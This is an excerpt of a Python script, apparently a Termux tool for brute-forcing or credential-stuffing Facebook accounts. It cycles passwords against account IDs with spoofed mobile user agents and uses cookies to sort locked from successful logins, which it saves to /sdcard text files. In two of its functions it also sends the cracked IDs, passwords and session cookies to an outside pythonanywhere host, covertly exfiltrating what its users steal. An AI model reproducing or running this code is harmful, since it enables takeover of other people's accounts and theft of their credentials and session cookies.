...
print('\n \033[1;36m Complete [\x1b[1;92m•••\x1b[1;97m]\033[1;36m \033[1;32m⠟100%')
...
{red}[{white}✓{red}]{green} ONWER & CEO  {white}▶︎ {yelloww}𝐜𝐡𝐨𝐲𝐨𝐧 {rad}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
{red}[{white}✓{red}]{green} MODE         {white}▶︎ \033[1;36mFile {green}/ {rad}Random {yelloww}𝐗 \033[1;36mGmail
{red}[{white}✓{red}]{green} DEVICE       {white}▶︎ {green}[{green}{manufacturer_name}-{model_name}{green}]
{red}[{white}✓{red}]{green} SIM          {white}▶︎ {green}{simcard}
{red}[{white}✓{red}]{green} COUNTRY      {white}▶︎ {green}[\033[1;32m{current_country}{green}]
{red}[{white}✓{red}]{green} YOUR CITY    {white}▶︎ {green}[\033[1;32m{current_city}{green}]
...
def rmain():
    ...
    if xytee in ["1","01"]:
     ...
     os.system("xdg-open https://wa.me/+8801989733880");rmain()
    elif xytee in ["0","00"]:
...
def md1(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Zer0-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
  sys.stdout.flush()
  ua, ua2 = Ugen(),Ugen2()
  ...
  for pw in pwv:
    try:
      ...
      "user-agent": 'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
      "accept": "*/*",
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Zer0-CP] {idf}|{pw}{xxx}')
        open('/sdcard/Zer0-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
        ...
        print(f'\r{H} [Zer0-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{P} Cookies {M}: {P}'+kuki)
         requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={idf}|{pw}|{kuki}")
        open('/sdcard/Zer0-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
...
def md2(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Zer0-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok))
  sys.stdout.flush()
  ua, ua2 = Ugen(),Ugen2()
  ses = requests.Session()
  for pw in pwv:
...
'lwv': '100',
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Zer0-Cp] {idf}|{pw}{xxx}')
        open('/sdcard/Zer0-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
...
def md3(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Zer0-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
  ua, ua2 = Ugen(),Ugen2()
  ses = requests.Session()
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Zer0-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
        open('/sdcard/Zer0-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ...
        if 'y' in cokix:
         print(f'\r{P} Cookies {M}:{P} '+kuki)
         requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={idf}|{pw}|{kuki}")
        open('/sdcard/Zer0-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
